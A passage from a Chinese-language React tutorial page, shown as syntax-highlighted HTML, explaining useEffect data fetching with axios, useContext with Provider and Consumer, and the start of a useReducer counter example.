function_">log</span>(data)<br>      <span class="hljs-title function_">setPosts</span>(data)<br>    &#125;).<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">rej</span>) =&gt;</span> &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(rej)<br>    &#125;)<br>  &#125;, [])<br><br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">        &#123;</span><br><span class="language-xml">          posts.map((item) =&gt; (</span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">li</span></span></span><br><span class="hljs-tag"><span class="language-xml">              <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;item.id&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">            &gt;</span></span><br><span class="language-xml">              &#123;item.title&#125;</span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="language-xml">          ))</span><br><span class="language-xml">        &#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">FetchData</span><br></code></pre></td></tr></table></figure><p>注意 useEffect 第二个依赖参数传入空数组，保证了 useEffect 只执行一次。</p><p>输入id获取不同数据</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useState, useEffect &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;axios&#x27;</span><br><br><span class="hljs-keyword">interface</span> postType &#123;<br>  <span class="hljs-attr">userId</span>: <span class="hljs-built_in">number</span><br>  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span><br>  <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span><br>  <span class="hljs-attr">body</span>: <span class="hljs-built_in">string</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">FetchData</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [post, setPost] = useState&lt;postType&gt;()<br>  <span class="hljs-keyword">const</span> [id, setId] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;1&#x27;</span>)<br><br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (id) &#123;<br>      axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">`https://jsonplaceholder.typicode.com/posts/<span class="hljs-subst">$&#123;id&#125;</span>`</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">const</span> <span class="hljs-attr">data</span>: postType = res.<span class="hljs-property">data</span><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data)<br>        <span class="hljs-title function_">setPost</span>(data)<br>      &#125;).<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err)<br>      &#125;)<br>    &#125;<br>  &#125;, [id])<br><br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;id&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;(e)</span> =&gt;</span> &#123;</span><br><span class="language-xml">          setId(e.target.value)</span><br><span class="language-xml">        &#125;&#125;</span><br><span class="language-xml">      /&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        &#123;</span><br><span class="language-xml">          post &amp;&amp; post.title</span><br><span class="language-xml">        &#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">FetchData</span><br></code></pre></td></tr></table></figure><p>点击Button触发effect：监听按钮点击触发变化，执行 effect 方法</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useState, useEffect &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;axios&#x27;</span><br><br><span class="hljs-keyword">interface</span> postType &#123;<br>  <span class="hljs-attr">userId</span>: <span class="hljs-built_in">number</span><br>  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span><br>  <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span><br>  <span class="hljs-attr">body</span>: <span class="hljs-built_in">string</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">FetchData</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [post, setPost] = useState&lt;postType&gt;()<br>  <span class="hljs-keyword">const</span> [id, setId] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;1&#x27;</span>)<br>  <span class="hljs-keyword">const</span> [idFromBtnClick, setIdFromBtnClick] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;1&#x27;</span>)<br><br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (idFromBtnClick) &#123;<br>      axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">`https://jsonplaceholder.typicode.com/posts/<span class="hljs-subst">$&#123;idFromBtnClick&#125;</span>`</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">const</span> <span class="hljs-attr">data</span>: postType = res.<span class="hljs-property">data</span><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data)<br>        <span class="hljs-title function_">setPost</span>(data)<br>      &#125;).<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err)<br>      &#125;)<br>    &#125;<br>  &#125;, [idFromBtnClick])<br><br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;id&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;(e)</span> =&gt;</span> &#123;</span><br><span class="language-xml">          setId(e.target.value)</span><br><span class="language-xml">        &#125;&#125;</span><br><span class="language-xml">      /&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> &#123;</span><br><span class="language-xml">          setIdFromBtnClick(id)</span><br><span class="language-xml">        &#125;&#125;</span><br><span class="language-xml">      &gt;Fetch Post<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        &#123;</span><br><span class="language-xml">          post &amp;&amp; post.title</span><br><span class="language-xml">        &#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">FetchData</span><br></code></pre></td></tr></table></figure><h5 id="3-useContext"><a href="#3-useContext" class="headerlink" title="3 useContext"></a>3 useContext</h5><blockquote><p>组件间传值</p></blockquote><p>Context api 是在组件树中传递数据但不用每层都经过的一种 api。</p><p>使用Context</p><ol><li>在根节点 App.tsx 中使用 <code>createContext()</code> 来创建一个 context</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">UserContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>创建一个 Context 对象。当 React 渲染一个订阅了这个 Context 对象的组件，这个组件会从组件树中离自身最近的那个匹配的 Provider 中读取到当前的 context 值。</p><p>只有当组件所处的树中没有匹配到 Provider 时，其 defaultValue 参数才会生效。这有助于在不使用 Provider 包装组件的情况下对组件进行测试。注意：将 undefined 传递给 Provider 的 value 时，消费组件的 defaultValue 不会生效。</p><ol start="2"><li>提供Provider</li></ol><p>在根节点中使用 Provider 包裹子节点，将 context 提供给子节点</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript">&lt;<span class="hljs-title class_">UserContext</span>.<span class="hljs-property">Provider</span> value=&#123;<span class="hljs-string">&#x27;chuanshi&#x27;</span>&#125;&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ComponentC</span> /&gt;</span></span><br>&lt;/<span class="hljs-title class_">UserContext</span>.<span class="hljs-property">Provider</span>&gt;<br></code></pre></td></tr></table></figure><p>每个 Context 对象都会返回一个 Provider React 组件，它允许消费组件订阅 context 的变化。</p><p>Provider 接收一个 <code>value</code> 属性，传递给消费组件。一个 Provider 可以和多个消费组件有对应关系。多个 Provider 也可以嵌套使用，里层的会覆盖外层的数据。</p><p>当 Provider 的 <code>value</code> 值发生变化时，它内部的所有消费组件都会重新渲染。Provider 及其内部 consumer 组件都不受制于 <code>shouldComponentUpdate</code> 函数，因此当 consumer 组件在其祖先组件退出更新的情况下也能更新。</p><p>通过新旧值检测来确定变化，使用了与 Object.is 相同的算法。</p><p>别忘了将之前定义好的 Context export 出去，以便在子孙节点中引入</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">UserContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>完整写在app.tsx的代码为：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;./App.css&#x27;</span><br><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">ComponentC</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/16ComponentC&#x27;</span><br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">UserContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">App</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;App&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">UserContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;</span>&#x27;<span class="hljs-attr">chuanshi</span>&#x27;&#125;&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">ComponentC</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">UserContext.Provider</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">App</span><br></code></pre></td></tr></table></figure><ol start="3"><li>在使用的节点处消费Context</li></ol><p>import context 对象</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">UserContext</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../App&#x27;</span><br></code></pre></td></tr></table></figure><p>使用 Consumer 进行消费</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs tsx">&lt;<span class="hljs-title class_">UserContext</span>.<span class="hljs-property">Consumer</span>&gt;<br>  &#123;<br>    <span class="hljs-function">(<span class="hljs-params">user</span>) =&gt;</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        User context value &#123;user&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>    )<br>  &#125;<br>&lt;/<span class="hljs-title class_">UserContext</span>.<span class="hljs-property">Consumer</span>&gt;<br></code></pre></td></tr></table></figure><p>这里，React 组件也可以订阅到 context 变更。这能让你在函数式组件中完成订阅 context。</p><p>这需要函数作为子元素（function as a child）这种做法。这个函数接收当前的 context 值，返回一个 React 节点。传递给函数的 value 值等同于往上组件树离这个 context 最近的 Provider 提供的 value 值。如果没有对应的 Provider，value 参数等同于传递给 createContext() 的 defaultValue。</p><hr><p>多个Context情况</p><p>在app.tsx中增加一个Context：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;./App.css&#x27;</span><br><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">ComponentC</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/16ComponentC&#x27;</span><br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">UserContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">ChannelContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">App</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;App&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">UserContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;</span>&#x27;<span class="hljs-attr">chuanshi</span>&#x27;&#125;&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">ChannelContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;</span>&#x27;<span class="hljs-attr">code</span> <span class="hljs-attr">volution</span>&#x27;&#125;&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">ComponentC</span> /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">ChannelContext.Provider</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">UserContext.Provider</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">App</span><br></code></pre></td></tr></table></figure><p>接下来在 component F 中消费它们</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">UserContext</span>, <span class="hljs-title class_">ChannelContext</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../App&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ComponentF</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">UserContext.Consumer</span>&gt;</span></span><br><span class="language-xml">        &#123;</span><br><span class="language-xml">          (user) =&gt; (</span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">ChannelContext.Consumer</span>&gt;</span></span><br><span class="language-xml">              &#123;</span><br><span class="language-xml">                (channel) =&gt; (</span><br><span class="language-xml">                  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">                    User context value &#123;user&#125;, channel value &#123;channel&#125;</span><br><span class="language-xml">                  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">                )</span><br><span class="language-xml">              &#125;</span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">ChannelContext.Consumer</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">          )</span><br><span class="language-xml">        &#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">UserContext.Consumer</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">ComponentF</span><br></code></pre></td></tr></table></figure><p>更好的方式：使用useContext hook api</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useContext &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">ComponentF</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./16ComponentF&#x27;</span><br><span class="hljs-keyword">import</span> &#123;<span class="hljs-title class_">UserContext</span>, <span class="hljs-title class_">ChannelContext</span>&#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../App&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ComponentE</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> user = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">UserContext</span>)<br>  <span class="hljs-keyword">const</span> channel = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ChannelContext</span>)<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      &#123;user&#125; - &#123;channel&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">ComponentE</span><br></code></pre></td></tr></table></figure><p>关键的代码：<code>const value = useContext(MyContext)</code></p><p>useContext 方法接收一个 context 对象（<code>React.createContext</code> 的返回值）并返回该 context 的当前值。当前的 context 值由上层组件中距离当前组件最近的 <code>&lt;MyContext.Provider&gt;</code> 的 <code>value</code> prop 决定。</p><p>当组件上层最近的 <code>&lt;MyContext.Provider&gt;</code> 更新时，该 Hook 会触发重渲染，并使用最新传递给 <code>MyContext</code> provider 的 context <code>value</code> 值。即使祖先使用 <code>React.memo</code> 或 <code>shouldComponentUpdate</code>，也会在组件本身使用 <code>useContext</code> 时重新渲染。</p><p>可以理解为，<code>useContext(MyContext)</code> 相当于 class 组件中的 <code>static contextType = MyContext</code> 或者 <code>&lt;MyContext.Consumer&gt;</code>。</p><p><code>useContext(MyContext)</code> 只是让你能够读取 context 的值以及订阅 context 的变化。你仍然需要在上层组件树中使用 <code>&lt;MyContext.Provider&gt;</code> 来为下层组件提供 context。</p><h5 id="4-useReducer"><a href="#4-useReducer" class="headerlink" title="4 useReducer"></a>4 useReducer</h5><blockquote><p>对值或对象的复杂变化统一管理</p></blockquote><p><code>useReducer</code> 是一个用于状态管理的 hook api。是 <code>useState</code> 的替代方案。</p><p>那么 <code>useReducer</code> 和 <code>useState</code> 的区别是什么呢？答案是<code>useState</code> 是使用 <code>useReducer</code> 构建的。</p><p>使用：<code>[newState, dispatch] = useReducer(reducer, initialState)</code></p><hr><p>一个简单例子：CounterOne.tsx</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useReducer &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">const</span> initialState = <span class="hljs-number">0</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">reducer</span> = (<span class="hljs-params">state: <span class="hljs-built_in">number</span>, action: <span class="hljs-built_in">string</span></span>) =&gt; &#123;<br>  <span class="hljs-keyword">switch</span> (action) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;increment&#x27;</span>:<br>      <span class="hljs-keyword">return</span> state + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;decrement&#x27;</span>:<br>      <span class="hljs-keyword">return</span> state - <span class="hljs-number">1</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;reset&#x27;</span>:<br>      <span class="hljs-keyword">return</span> initialState<br>    <span class="hljs-attr">default</span>:<br>      <span class="hljs-keyword">return</span> state<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">CounterOne</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, dispatch] = <span class="hljs-title function_">useReducer</span>(reducer, initialState)<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>Count - &#123;count&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatch(&#x27;increment&#x27;)&#125;</span><br><span class="language-xml">      &gt;Increment<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span 